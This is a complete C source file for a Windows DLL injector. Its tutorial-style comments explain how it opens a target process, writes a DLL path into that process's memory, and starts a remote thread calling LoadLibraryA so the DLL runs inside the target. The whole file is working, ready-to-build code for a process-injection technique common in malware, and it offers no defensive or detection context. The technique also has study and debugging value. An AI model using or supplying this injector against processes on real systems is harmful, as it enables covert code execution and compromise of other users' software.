// injector.c
// Classic DLL injection via CreateRemoteThread.
//
// Technique overview:
//   1. Open a handle to the target process
//   2. Allocate memory in the target process for the DLL path string
//   3. Write the DLL path into that memory
//   4. Spawn a remote thread in the target that calls LoadLibraryA(<dll path>)
//      -> Windows loads the DLL into the target process
//      -> DllMain is called automatically by the loader

#include <stdio.h>
#include <windows.h>

int main(int argc, char* argv[])
{
    if (argc != 3) {
        printf("Usage: injector.exe <PID> <full path to DLL>\n");
        printf("Example: injector.exe 1234 C:\\path\\to\\MyDll.dll\n");
        return 1;
    }

    DWORD targetPID = (DWORD)atoi(argv[1]);
    char* dllPath   = argv[2];
    size_t pathLen  = strlen(dllPath) + 1;

    printf("[*] Target PID : %lu\n", targetPID);
    printf("[*] DLL path   : %s\n", dllPath);

    // Step 1: Open a handle to the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Opened process handle: 0x%p\n", hProcess);

    // Step 2: Allocate memory inside the target process for the DLL path string.
    //         Only needs RW permissions — it holds data, not code.
    LPVOID remoteBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (remoteBuffer == NULL) {
        printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Allocated remote buffer at: 0x%p\n", remoteBuffer);

    // Step 3: Write the DLL path into the allocated buffer
    if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written to remote buffer\n");

    // Step 4: Create a remote thread that calls LoadLibraryA with our DLL path.
    //         LoadLibraryA is in kernel32.dll which is mapped at the same address
    //         in every process, so we can resolve it locally and use it remotely.
    LPTHREAD_START_ROUTINE loadLibraryAddr =
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        loadLibraryAddr,
        remoteBuffer, // argument passed to LoadLibraryA = the DLL path
        0,
        NULL
    );
    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created. Thread ID visible in Process Hacker.\n");

    // Wait for LoadLibraryA to finish, then clean up
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Injection complete.\n");

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
